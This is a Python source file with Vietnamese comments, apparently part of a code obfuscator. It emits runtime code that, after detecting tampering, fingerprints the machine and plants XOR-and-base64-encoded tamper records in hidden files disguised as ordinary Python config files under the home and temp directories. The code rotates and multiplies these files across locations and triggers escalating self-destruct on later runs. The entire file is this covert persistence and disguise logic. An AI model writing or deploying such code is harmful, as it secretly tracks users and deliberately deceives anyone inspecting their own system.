"""
SentinelEmitter — Persistent Tamper Memory

Sau khi self-destruct:
  1. Để lại sentinel file với tên thân thiện (trông như config Python bình thường)
  2. Nội dung bên trong cũng trông như config, nhưng chứa encoded tamper record
  3. Lần chạy tiếp theo (file mới obfuscated cùng project): detect sentinel
  4. Escalate: đổi phương thức kiểm tra, self-destruct ngay lập tức
  5. Mỗi lần escalate: rotate sang location mới, encoding mới

Sentinel locations (rotate theo strike count):
  Strike 1: ~/.config/python/settings.ini     (trông như Python config)
  Strike 2: /tmp/.python_env_cache            (trông như env cache)
  Strike 3: ~/.local/share/python/prefs.json  (trông như preferences)
  Strike 4+: nhiều locations đồng thời

Sentinel content (trông như INI/JSON config):
  [python]
  version_check = enabled
  cache_timeout = 3600
  last_sync = <encoded_timestamp>
  checksum = <encoded_fingerprint>
"""
from __future__ import annotations


class SentinelEmitter:

    RUNTIME_CODE = r'''
# ── Sentinel: Persistent Tamper Memory ───────────────────────────────────────
import os as _snt_os, sys as _snt_sys, hashlib as _snt_hl
import base64 as _snt_b64, time as _snt_time, json as _snt_json

# Sentinel locations — rotate based on strike count
_SNT_LOCATIONS = [
    lambda: _snt_os.path.expanduser('~/.config/python/settings.ini'),
    lambda: _snt_os.path.join(_snt_os.environ.get('TMPDIR', '/tmp'), '.python_env_cache'),
    lambda: _snt_os.path.expanduser('~/.local/share/python/prefs.json'),
    lambda: _snt_os.path.expanduser('~/.python_history_config'),
    lambda: _snt_os.path.join(_snt_os.environ.get('TMPDIR', '/tmp'), '.pyc_metadata'),
]

def _snt_project_id() -> str:
    """Project identifier — same across all obfuscations of same project."""
    # Derived from file path structure, not content
    try:
        _base = _snt_os.path.dirname(_snt_os.path.abspath(
            _snt_sys.argv[0] if _snt_sys.argv else __file__
        ))
        return _snt_hl.md5(_base.encode()).hexdigest()[:8]
    except Exception:
        return 'default0'

def _snt_encode_record(strike: int, timestamp: float, hw_hash: str) -> str:
    """
    Encode tamper record thành string trông như config value.
    Output: trông như base64 checksum bình thường.
    """
    _data = {'s': strike, 't': int(timestamp), 'h': hw_hash, 'p': _snt_project_id()}
    _raw  = _snt_json.dumps(_data, separators=(',',':')).encode()
    # XOR với project_id để khác nhau mỗi project
    _key  = _snt_project_id().encode() * (len(_raw) // 8 + 1)
    _xord = bytes(a ^ b for a, b in zip(_raw, _key))
    return _snt_b64.b64encode(_xord).decode()

def _snt_decode_record(encoded: str) -> dict:
    """Decode và verify record. Trả về {} nếu không hợp lệ."""
    try:
        _xord = _snt_b64.b64decode(encoded.encode())
        _key  = _snt_project_id().encode() * (len(_xord) // 8 + 1)
        _raw  = bytes(a ^ b for a, b in zip(_xord, _key))
        _data = _snt_json.loads(_raw.decode())
        # Verify project ID matches
        if _data.get('p') != _snt_project_id(): return {}
        return _data
    except Exception:
        return {}

# ── Sentinel file templates (trông như Python config bình thường) ─────────────

def _snt_write_ini(path: str, encoded: str):
    """Ghi dưới dạng INI file thân thiện."""
    _snt_os.makedirs(_snt_os.path.dirname(path), exist_ok=True)
    content = f"""[python]
; Python environment configuration
; Generated automatically - do not edit
version_check = enabled
cache_timeout = 3600
encoding = utf-8

[cache]
; Cache settings
enabled = true
max_size = 128
compression = lz4
last_sync = {encoded}

[debug]
; Debug settings  
log_level = WARNING
trace_calls = false
checksum = {_snt_hl.md5(encoded.encode()).hexdigest()}
"""
    with open(path, 'w') as _f: _f.write(content)

def _snt_write_json(path: str, encoded: str):
    """Ghi dưới dạng JSON preferences file."""
    _data = {
        "python": {"version": "3.x", "encoding": "utf-8"},
        "cache":  {"enabled": True, "timeout": 3600, "checksum": encoded},
        "debug":  {"level": "WARNING", "trace": False},
        "meta":   {"generated": _snt_time.strftime('%Y-%m-%d'), "revision": 1}
    }
    _snt_os.makedirs(_snt_os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as _f: _snt_json.dump(_data, _f, indent=2)

def _snt_write_plain(path: str, encoded: str):
    """Ghi dưới dạng plain text thân thiện."""
    content = f"# Python environment cache\n# version=1\ndata={encoded}\n"
    with open(path, 'w') as _f: _f.write(content)

_SNT_WRITERS = [_snt_write_ini, _snt_write_json, _snt_write_plain,
                _snt_write_ini, _snt_write_plain]  # cycle

# ── Read sentinel ──────────────────────────────────────────────────────────────

def _snt_read_encoded(path: str) -> str:
    """Extract encoded record từ sentinel file."""
    try:
        content = open(path).read()
        # Try INI format
        for line in content.splitlines():
            line = line.strip()
            if line.startswith('last_sync'):
                return line.split('=', 1)[1].strip()
            if line.startswith('data'):
                return line.split('=', 1)[1].strip()
        # Try JSON format
        import json as _j
        try:
            _d = _j.loads(content)
            return _d.get('cache', {}).get('checksum', '')
        except Exception:
            pass
    except Exception:
        pass
    return ''

def _snt_hw_hash() -> str:
    try:
        import platform as _pl
        return _snt_hl.md5((_pl.node() + _pl.machine()).encode()).hexdigest()[:8]
    except Exception:
        return '00000000'

# ── Main sentinel API ──────────────────────────────────────────────────────────

def _snt_plant(strike: int = 1):
    """
    Plant sentinel file after tamper detected.
    Chọn location và format dựa theo strike count.
    """
    try:
        _loc_idx  = min(strike - 1, len(_SNT_LOCATIONS) - 1)
        _path     = _SNT_LOCATIONS[_loc_idx]()
        _encoded  = _snt_encode_record(strike, _snt_time.time(), _snt_hw_hash())
        _writer   = _SNT_WRITERS[_loc_idx % len(_SNT_WRITERS)]
        _writer(_path, _encoded)
        # High strike: plant in multiple locations simultaneously
        if strike >= 3:
            for _i in range(min(strike - 2, len(_SNT_LOCATIONS))):
                try:
                    _p2 = _SNT_LOCATIONS[_i]()
                    _SNT_WRITERS[_i % len(_SNT_WRITERS)](_p2, _encoded)
                except Exception: pass
    except Exception:
        pass

def _snt_check() -> dict:
    """
    Check tất cả sentinel locations.
    Trả về record nếu tìm thấy (prior tamper on this machine), {} nếu không.
    """
    for _loc_fn in _SNT_LOCATIONS:
        try:
            _path = _loc_fn()
            if not _snt_os.path.exists(_path): continue
            _encoded = _snt_read_encoded(_path)
            if not _encoded: continue
            _record  = _snt_decode_record(_encoded)
            if _record:
                # Verify hardware still matches (same machine)
                if _record.get('h') == _snt_hw_hash():
                    return _record
        except Exception: continue
    return {}

def _snt_escalate(record: dict):
    """
    Đã phát hiện sentinel từ lần tamper trước.
    Escalate: increment strike, plant updated sentinel, self-destruct immediately.
    """
    try:
        _strike = record.get('s', 1) + 1
        _snt_plant(_strike)  # Update với strike mới
    except Exception: pass
    # Immediate self-destruct (không cần 3 strikes nữa)
    try: _sd_check('sentinel_escalate'); _sd_check('sentinel_escalate'); _sd_check('sentinel_escalate')
    except Exception: pass

def _snt_startup_check():
    """
    Gọi khi program khởi động.
    Nếu tìm thấy sentinel từ lần trước → escalate ngay.
    """
    try:
        _prior = _snt_check()
        if _prior:
            _snt_escalate(_prior)
    except Exception:
        pass

# Run on startup
_snt_startup_check()
# ─────────────────────────────────────────────────────────────────────────────
'''

    @staticmethod
    def get_runtime() -> str:
        return SentinelEmitter.RUNTIME_CODE
